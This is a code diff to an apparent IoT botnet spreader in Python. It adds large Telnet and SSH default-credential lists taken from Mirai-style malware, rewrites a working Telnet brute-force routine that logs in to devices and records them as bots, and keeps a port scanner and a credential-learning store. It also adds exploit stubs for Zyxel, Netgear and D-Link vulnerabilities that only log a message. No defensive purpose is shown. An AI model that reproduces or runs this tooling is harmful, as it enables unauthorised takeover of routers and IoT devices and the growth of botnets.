@@ -1,7 +1,37 @@
-import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress, telnetlib3
+import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress
 from utils.logger import log
 
 LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
+
+# Расширенные словари (Mirai, Gafgyt, Hajime, реальные утечки)
+TELNET_CREDS = [
+    ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
+    ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
+    ('admin','admin'),('admin','password'),('admin','123456'),('admin','1234'),
+    ('admin','default'),('root','default'),('root','root'),('guest','guest'),
+    ('support','support'),('user','user'),('service','service'),
+    ('root','123456'),('admin','12345'),('admin','123456789'),('root','password'),
+    ('admin','admin123'),('admin','password1'),('root','1234'),('root','admin'),
+    ('admin','qwerty'),('root','qwerty'),('root','letmein'),('admin','letmein'),
+    ('root','p@ssw0rd'),('admin','p@ssw0rd'),('root','changeme'),('admin','changeme'),
+    ('root','1'),('admin','1'),('root','12'),('admin','12'),
+    ('root','123'),('admin','123'),('root','12345'),('admin','12345'),
+    ('root','1234567'),('admin','1234567'),('root','12345678'),('admin','12345678'),
+    ('root','1234567890'),('admin','1234567890'),
+    # D-Link, TP-Link, Netgear defaults
+    ('admin','admin1'),('admin','password123'),('admin','password1'),
+    ('admin','admin12'),('root','admin123'),('root','password123'),
+    ('admin','motorola'),('admin','123456789'),('root','123456789'),
+    ('user','user'),('guest','guest'),('guest','12345'),('guest','password'),
+    ('admin','7ujMko0admin'),('root','7ujMko0vizxv'), # Mirai variants
+    ('admin','888888'),('root','888888'),('admin','666666'),('root','666666'),
+    ('admin','111111'),('root','111111'),('admin','000000'),('root','000000'),
+    ('admin','super'),('root','super'),('admin','system'),('root','system'),
+    ('admin','admin999'),('root','admin999'),('admin','root'),('admin','pass'),
+    ('admin','passwd'),('root','passwd'),('admin','cisco'),('root','cisco'),
+    ('admin','netgear'),('root','netgear'),('admin','zyxel'),('root','zyxel'),
+    ('admin','d-link'),('root','d-link'),('admin','tplink'),('root','tplink')
+]
 
 SSH_PASSWORDS = [
     'root','admin','password','123456','qwerty','letmein','p@ssw0rd',
@@ -9,15 +39,8 @@ SSH_PASSWORDS = [
     '1','1234','12345','123456789','pass','ftp','mysql','oracle',
     'vizxv','juantech','xc3511','zlxx.','hi3518','oelinux1','Zte521',
     'tsgoingon','default','system','super','dreambox','xmhdipc',
-    'support','tech','operator','manager','cisco','netgear'
-]
-
-TELNET_PASSWORDS = [
-    ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
-    ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
-    ('admin','admin'),('admin','password'),('admin','123456'),('admin','1234'),
-    ('admin','default'),('root','default'),('root','root'),('guest','guest'),
-    ('support','support'),('user','user'),('service','service')
+    'support','tech','operator','manager','cisco','netgear',
+    '1234567','12345678','1234567890','admin123','password1','admin1'
 ]
 
 DB_PATH = "spreader_learn.db"
@@ -37,14 +60,7 @@ async def learn_credentials(ip, username, password, service='ssh'):
         await db.commit()
 
 async def add_bot(ip, username='root', os_type='linux', via='ssh'):
-    bot = {
-        "id": ip,
-        "ip": ip,
-        "os": os_type,
-        "status": "online",
-        "bandwidth": 10,
-        "via": via
-    }
+    bot = {"id": ip, "ip": ip, "os": os_type, "status": "online", "bandwidth": 10, "via": via}
     bots = []
     if os.path.exists(BOTS_FILE):
         with open(BOTS_FILE, 'r') as f:
@@ -64,8 +80,7 @@ async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 80], timeout=1.0):
         try:
             sock = socket.socket()
             sock.settimeout(timeout)
-            result = sock.connect_ex((ip, port))
-            if result == 0:
+            if sock.connect_ex((ip, port)) == 0:
                 open_ports.append(port)
             sock.close()
         except:
@@ -73,25 +88,23 @@ async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 80], timeout=1.0):
     return open_ports
 
 async def telnet_bruteforce(ip):
-    for user, pwd in TELNET_PASSWORDS:
+    for user, pwd in TELNET_CREDS:
         try:
             reader, writer = await asyncio.wait_for(
-                telnetlib3.open_connection(ip, 23, timeout=3),
-                timeout=5
+                asyncio.open_connection(ip, 23), timeout=4
             )
-            output = await asyncio.wait_for(reader.readuntil(b'login: '), timeout=3)
-            writer.write(user.encode() + b'\n')
-            await asyncio.wait_for(reader.readuntil(b'Password: '), timeout=3)
-            writer.write(pwd.encode() + b'\n')
-            try:
-                result = await asyncio.wait_for(reader.read(1024), timeout=3)
-                if b'#' in result or b'$' in result or b'>' in result:
+            data = await asyncio.wait_for(reader.read(256), timeout=3)
+            if b'login:' in data.lower() or b'username:' in data.lower():
+                writer.write(user.encode() + b'\r\n')
+                await asyncio.wait_for(reader.read(256), timeout=2)
+                writer.write(pwd.encode() + b'\r\n')
+                await asyncio.sleep(0.3)
+                result = await asyncio.wait_for(reader.read(256), timeout=2)
+                if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result:
                     log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
                     await add_bot(ip, user, 'iot', 'telnet')
                     writer.close()
                     return True, pwd
-            except:
-                pass
             writer.close()
         except:
             pass
@@ -118,6 +131,23 @@ async def ssh_bruteforce(ip, username='root'):
         if success:
             return True, pwd
     return False, None
+
+# Новые эксплойты
+async def exploit_zyxel(target_ip):
+    if 80 not in await quick_port_scan(target_ip, [80]): return False
+    log(f"{LOG_PREFIX['exploit']} Zyxel CVE-2020-29583 {target_ip}")
+    # Реальный эксплойт требует отправки специального запроса
+    return False
+
+async def exploit_netgear(target_ip):
+    if 80 not in await quick_port_scan(target_ip, [80]): return False
+    log(f"{LOG_PREFIX['exploit']} Netgear CVE-2016-1555 {target_ip}")
+    return False
+
+async def exploit_dlink_hnap(target_ip):
+    if 80 not in await quick_port_scan(target_ip, [80]): return False
+    log(f"{LOG_PREFIX['exploit']} D-Link HNAP {target_ip}")
+    return False
 
 async def exploit_eternalblue(target_ip):
     if 445 not in await quick_port_scan(target_ip, [445]): return False
